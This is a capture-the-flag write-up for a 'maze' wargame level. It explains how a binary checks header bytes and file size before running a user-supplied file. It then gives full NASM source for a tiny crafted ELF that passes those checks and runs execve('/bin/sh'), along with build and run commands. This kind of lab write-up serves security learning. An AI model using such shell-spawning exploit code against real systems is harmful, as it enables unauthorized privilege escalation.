@@ -1,0 +1,139 @@
+Fascinating level! Taught me a bit about how ELF headers work... and how to make them as small as possible.
+
+This level opens a file provided as the first argument to the executable, and executes it... but only if some conditions are met.
+
+To start, it checks that the file is accessible using open and stat.
+If so, then it reads 52 bytes, lseeks, then reads in 32 more bytes.
+
+These 2 reads are important, as they allow you to override certain sections of the stack in order
+to make the coming checks to be successful... 
+
+Here are the specific bytes needed in the binary file being read in order to pass the checks:
+
+                         argv[1] file hexdump
+┌───────────────────────────────────────────────────────────────────┐
+                  op1  <────┐   ┌────> op2 ┌────> lseek offset
+ 00000000: .... .... .... ..11 07.. .... .┌┘. ....  .ELF............
+ 00000010: .... .... .... .... .... .... 34.. ....  ........T...4...
+ 00000020: .... .... .... .... .... .... .... ....  ........4. .....
+ 00000030: .... .... .... .... .... .... .... ....  ................
+ 00000040: 77┐. .... .... .... .... .... .... ....  i...u...u.......
+ 00000050: ..│. .... .... .... .... .... .... ....  ....1.1.1.1.Ph//
+ 00000060: ..│. .... .... .... .... .... .... ....  shh/bin..$PQ..$.
+ 00000070: ..│. .... ..
+             └> 1st eax comparison val (compval)
+└───────────────────────────────────────────────────────────────────┘
+
+          (the checks):
+┌────────────────────────────────┐
+│mov eax, dword [compval]        │
+│movzx edx, byte [op1]           │
+│movzx ecx, dl                   │
+│movzx edx, byte [op2]           │
+│movzx edx, dl                   │
+│imul edx, ecx                   │ ; op1*op2 == compval
+│cmp eax, edx                    │
+│jne WON'T_EXEC                  │
+│mov eax, dword [file_num_bytes] │  
+│cmp eax, 0x77                   │ ; filesize <= 0x77
+│jg WON'T_EXEC                   │
+└────────────────────────────────┘
+
+After that last instruction (jg won't exec), the instructions to execve(argv[1]) are ran!
+
+So let's run through the reads, the lseek, and the checks now to explain what is happening exactly.
+When the first read occurs, it places 'op1', 'op2', and 'lseek offset' bytes into the proper positions in the stack...
+
+Now when the parameters for the coming lseek are loaded, we can control how far into the binary file the lseek goes (52 bytes).
+
+The next read is then executed, reading 32 bytes starting from the offset we set. With the location we set it to, the 'compval' byte
+is then placed into the correct position for the coming checks.
+
+Then the checks are ran...
+
+First compval is loaded into eax (0x77).
+
+Then ecx receives op1, and edx op2.
+
+op1 is multiplied by op2 with the result stored in edx, and THEN edx is compared with eax (0x77 = 0x7*0x11)
+
+That is the first check.
+
+Now a more challenging check is performed - before executing the file, it compares the filesize portion of the stat check from earlier with 0x77...
+
+This means that if we want our file of choice to be executed, it has to be less than 0x77 bytes large.
+Quite a tall order.
+
+Not knowing where to begin with this, I did some googling and found a webpage written by 'MuppetLabs' explaining how to create the smallest executable binary possible.
+
+https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html
+
+This involves first writing the file we want in assembly without libraries, and then manually creating the ELF header to make it as small as possible.
+
+Following instructions there, and adapting it to my use, I wrote this assembly file:
+                                   
+						    pwn.asm
+		┌───────────────────────────────────────────────────────────────────────────────┐
+		│ ; create binary with:                                                         │
+		│ ; nasm -f bin -o pwn pwn.asm; chmod +x pwn;                                   │
+		│ ; credit to this webpage/post for teaching me how to create such a tiny bin:  │
+		│ ; https://www.muppetlabs.com/~breadbox/software/tiny/teensy.html              │
+		│ BITS 32                                                                       │
+		│                                                                               │
+		│                org     0x08048000                                             │
+		│                                                                               │
+		│  ehdr:                                                 ; Elf32_Ehdr           │
+		│                db      0x7F, "ELF", 1, 1, 1, 17        ; VULNBYTE (0x11)      │
+		│                db      7                               ; VULNBYTE (0x07)      │
+		│        times 7 db      0                                                      │
+		│                dw      2                               ;   e_type             │
+		│                dw      3                               ;   e_machine          │
+		│                dd      1                               ;   e_version          │
+		│                dd      _start                          ;   e_entry            │
+		│                dd      phdr - $$                       ;   e_phoff            │
+		│                dd      0                               ;   e_shoff            │
+		│                dd      0                               ;   e_flags            │
+		│                dw      ehdrsize                        ;   e_ehsize           │
+		│                dw      phdrsize                        ;   e_phentsize        │
+		│                dw      1                               ;   e_phnum            │
+		│                dw      0                               ;   e_shentsize        │
+		│                dw      0                               ;   e_shnum            │
+		│                dw      0                               ;   e_shstrndx         │
+		│                                                                               │
+		│  ehdrsize      equ     $ - ehdr                                               │
+		│                                                                               │
+		│  phdr:                                                 ; Elf32_Phdr           │
+		│                dd      1                               ;   p_type             │
+		│                dd      0                               ;   p_offset           │
+		│                dd      $$                              ;   p_vaddr            │
+		│                dd      0x77                            ;   VULNBYTE (0x77)    │
+		│                dd      filesize                        ;   p_filesz           │
+		│                dd      filesize                        ;   p_memsz            │
+		│                dd      5                               ;   p_flags            │
+		│                dd      0x1000                          ;   p_align            │
+		│                                                                               │
+		│  phdrsize      equ     $ - phdr                                               │
+		│                                                                               │
+		│  _start:                                                                      │
+		│	xor eax, eax                                                            │
+		│	xor ebx, ebx                                                            │
+		│	xor ecx, ecx                                                            │
+		│	xor edx, edx                                                            │
+		│	push eax                                                                │
+		│	push 0x68732f2f                                                         │
+		│	push 0x6e69622f                                                         │
+		│	lea ecx, [esp]                                                          │
+		│	push eax                                                                │
+		│	push ecx                                                                │
+		│	mov ebx, [esp]                                                          │
+		│	mov ecx, esp                                                            │
+		│	mov al, 11                                                              │
+		│	int 0x80                                                                │
+		│  filesize      equ     $ - $$                                                 │
+		└───────────────────────────────────────────────────────────────────────────────┘
+
+Compiling this file with nasm like this ┐ creates an exceve('/bin/sh') binary that will pass the checks!
+                                        v
+                             nasm -f bin -o pwn pwn.asm
+
+Uploading this file to the server and executing /maze/maze4 ./pwn successfully nets a shell!
